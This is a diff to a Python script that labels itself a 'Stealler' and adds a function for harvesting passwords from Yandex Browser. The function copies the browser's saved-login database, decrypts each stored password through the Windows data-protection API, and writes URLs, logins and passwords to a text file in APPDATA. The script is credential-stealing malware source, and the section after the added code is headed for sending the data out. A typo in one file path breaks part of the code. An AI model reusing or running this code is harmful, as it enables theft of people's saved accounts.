@@ -42,6 +42,27 @@ file = open(os.getenv("APPDATA") + '\\alldata.txt', "w+")
 file.write(all_data)
 file.close()
 ################################################################################
+#                              YANDEX PASSWORDS                                #
+################################################################################
+def Yandexpass():
+    textyp = 'Passwords Yandex:' + '\n'
+    textyp += 'URL | LOGIN | PASSWORD' + '\n'
+    if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Yandex\\YandexBrowser\\User Data\\Default\\Ya Login Data.db'):
+        shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Yandex\\YandexBrowser\\User Data\\Default\\Ya Login Data.db', os.getenv("LOCALAPPDATA") + '\\Yandex\\YandexBrowser\\User Data\\Default\\Ya Login Data2.db')
+        conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Yandexe\\YandexBrowser\\User Data\\Default\\Ya Login Data2.db')
+        cursor = conn.cursor()
+        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
+        for result in cursor.fetchall():
+            password = win32crypt.CryptUnprotectData(result[2])[1].decode()
+            login = result[1]
+            url = result[0]
+            if password != '':
+                textyp += url + ' | ' + login + ' | ' + password + '\n'
+    return textyp
+file = open(os.getenv("APPDATA") + '\\yandex_passwords.txt', "w+")
+file.write(str(Yandexpass()) + '\n')
+file.close()
+################################################################################
 #                              ОТПРАВКА                                        #
 ################################################################################
 '↑Stealler by Andrew_Shipunov↑'.encode('utf-8')
